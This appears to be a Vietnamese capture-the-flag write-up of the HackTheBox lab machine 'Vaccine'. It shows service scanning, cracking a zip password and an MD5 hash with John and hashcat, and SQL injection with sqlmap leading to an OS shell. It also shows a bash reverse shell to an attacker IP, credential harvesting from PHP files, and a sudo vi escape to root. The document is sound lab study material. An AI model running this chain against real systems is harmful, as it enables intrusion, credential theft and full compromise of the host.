> Target Vaccine sẽ chỉ cho chúng ta biết vì sao tìm kiếm thông tin về target là quan trọng nhất, kể cả khi hệ thống trông có vẻ an toàn. Ngoài ra còn hiểu thêm về password cracking.
### 1. Tìm kiếm thông tin target
###### IP: 10.129.195.218
##### + Kiểm tra kết nối:
`ping 10.129.195.218`
##### + Kiểm tra cổng và dịch vụ: 
`nmap -sC -sV 10.129.195.218`
##### -> 21/tcp FTP; Anonymous FTP login allowed: cổng lưu trữ file
#####-> 22/tcp ssh; OpenSSH : kết nối từ xa
##### -> 80/tcp http; Apache httpd : web Server
### 2. Tìm kiếm lỗ hổng
#### 2.1 FTP:
##### + Kết nối với FTP với tài khoản Anonymous: `ftp 10.129.195.218`; không yêu cầu pass
##### + Kiểm tra trong các file trong FTP: `ftp> ls` -> backup.zip
##### + Lấy file về máy: `ftp> backup.zip`
##### + Upzip file: `unzip backup.zip` -> _file yêu cầu mật khẩu để unzip_
##### + Sử dụng John the Ripper the crack mật khẩu:
##### + Chuyển file zip thành hash trong file hashes: `zip2john backup.zip > hashes`
##### + Dùng john để đọc file hashes: `john -wordlist=/usr/share/wordlists/rockyou.txt hashes`
###### trong cơ chế mật khẩu của file zip, mật khẩu thường được sử dụng để tạo ra một giá trị hash nhằm tăng tính bảo mật (không thể lấy được mật khẩu gốc), tuy nhiên nếu sử dụng John the RIpper, nó sẽ sử dụng danh sách các từ có sẵn, chuyển thành giá trị hash, so sánh với giá trị hash của file zip. Nếu trùng, sẽ lưu vào file hash để chuyển về từ, từ đó mật khẩu bị phá.
##### -> mật khẩu cho file backup.zip: _741852963_
+ Giải nén file -> 2 file index.php, style.css
+ Kiểm tra file _index.php_, thấy trong cơ chế login có sử dụng _username_ và _password_ để so sánh khi login.
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/520eecc7-8f1a-4729-afa2-f1533d2777fc)
##### -> username : _admin_ & password : _2cb42f8734ea607eefed3b70af13bbd3_
##### + Vì đây là file_ .php_ và _.css_ nên có thể đoán tên người dùng và mật khẩu được sử dụng cho trang login.
#### 2.2 Web:
##### + truy cập trên trình duyệt với địa chỉ: 10.129.195.218
##### -> giao diện login
##### + Xem qua các công nghệ được sử dụng để build trang: `Wappalyzer`.
##### + Thử username và password lấy được trong `FTP`-> không đúng -> có thể mật khẩu là giá trị hash.
##### + Kiểm tra loại hash: 
` hashid 2cb42f8734ea607eefed3b70af13bbd3 `
##### + Thử với *MD5* trước vì tính phổ biến với *hashcat*:
##### + Đẩy pass vào một file: 
```
echo ‘2cb42f8734ea607eefed3b70af13bbd3’ > hashpass
hashcat -a 0 -m 0 hashpass /usr/share/wordlists/rockyou.txt
```
######	-a 0: chọn mode attack, ở đây 0 là sử dụng một danh sách từ có sẵn (rockyou.txt)
######	-m 0: chọn type của hash, 0 là MD5
######	hashpass: file để attack
######	/usr/share/wordlists/rockyou.txt: file chứa danh sách từ để attack
##### + Lấy được password là *qwerty789*
##### + Thử truy cập lại vào trang web login -> vào được.
##### + Trang web không có gì đặc biệt, trừ thanh công cụ search khi tìm kiếm sẽ hiện trên thanh URL: 
` 10.129.195.218/dashboard.php?search=zeus `
##### -> Lỗ hổng SQL Injection.

### 3. Tấn công lỗ hổng:
#### 3.1 SQL Injection trang web:
##### + Sử dụng tool _sqlmap_, môt công cụ sql injection tự động.
##### + Vì sqlmap yêu cầu cả URL và cookie của target, nên sẽ lấy cookie:
###### Yêu cầu cookie vì nó thể hiện trạng thái thông tin về người dùng khi tương tác với website, khiến yêu cầu của người dùng hợp lệ, trong trường hợp này là sql injection biến search.
##### + Cài extension _cookie-editor_, một extension cho cookie chuyên dụng.
##### + Sau khi lấy được cookies, sử dụng sqlmap để kiểm tra xem trang web có lỗ hổng sql injection không.
` sqlmap -u ‘http://10.129.195.218/dashboard.php?search=any+query’ --cookie=”PHPSESSID=t5r0jg65lsnmg7d5qlqis9gbuh” `
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/d6725adb-26e4-4e66-894f-7e1ae454d151)
##### => trường *search* của trang web có sql injection.
##### + Chạy lệnh trên một lần nữa và kèm sau cuois là flag `--os-shell` để khởi tạo terminal:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/7b8762cc-a73e-4ec5-9ac4-f293a5af413a)
#### 3.2 Reverse shell target:
##### + Như mọi lần shell mặc định của các tool thường kết nối không ổn định mà chỉ được sử dụng để reverse shell.
##### + Bật netcat: `sudo nc -lvnp 443`
##### + Sử dụng payload: `bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1”` trên shell của sqlmap.
##### + Quay về bên netcat ta sẽ được như sau: 
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/04e4dc0a-d7e4-4df7-9123-3d81959d60e7)
##### + Như vậy đã reverse shell thành công giờ để làm shell mang tinh tương tác cao, sử dụng lệnh sau: 
```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
stty raw -echo
export TERM=xterm
```
##### + Kiểm tra người dùng vừa chiếm quyền với lệnh `whoami` -> user tên *postgres*
##### + Biết rằng các file của web sẽ thường được lưu trong `/var/www/html` và vì sử dụng PHP và SQL nên sẽ có thông tin của người dùng dưới dạng văn bản để kiếm tra input.
##### + Trong file dashboard.php:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/bf18542b-50dd-403a-8362-cb4caf16e3af)
##### -> password: _P@s5w0rd!_
#### 3.3 SSH & Privillege Escaltion:
##### + Biết được tên người dùng, mật khẩu nên ta sẽ sử dụng ssh thay vì netcat 
###### Netcat kết nối đôi khi bị ngắt và thao tác phức tạp hơn.
` ssh postgres@10.129.195.218 `
##### + Sau khi ssh thành công, xem quyền của user: `sudo -l`
##### -> user có quyền chạy lệnh sudo /bin/vi /etc/postgresql/11/main/pg/hba.conf  trên target Vaccine
##### + Đây là một lỗ hổng khi một chương trình được root cho phép chạy dưới dạng ‘sudo’ thì chương trình đó có thể được sử dụng để truy cập, mod vào các file không được phép.
###### Tham khảo thêm về lỗ hổng này: https://gtfobins.github.io/gtfobins/vi/#sudo
##### + sử dụng lệnh sau để mở shell với quyền superuser (root):
`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ‘ :!/bin/sh’ /dev/null`
##### + Lệnh trên không được chương trình cho phép nên sẽ sử dụng lệnh thay thế: 
```
vi pg_hba.conf
	:set shell=/bin/sh
	:shell
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/bb261c67-9036-454d-978a-d1e68bd6ffea)
##### + set lệnh set shell tương tự và sau khi bấm Enter sẽ hiển thị về màn hình terminal với vai trò root :
```
# whoami
root
# 
```
##### -> Privillege escaltion thành công!
###### flag của root nằm trong /root

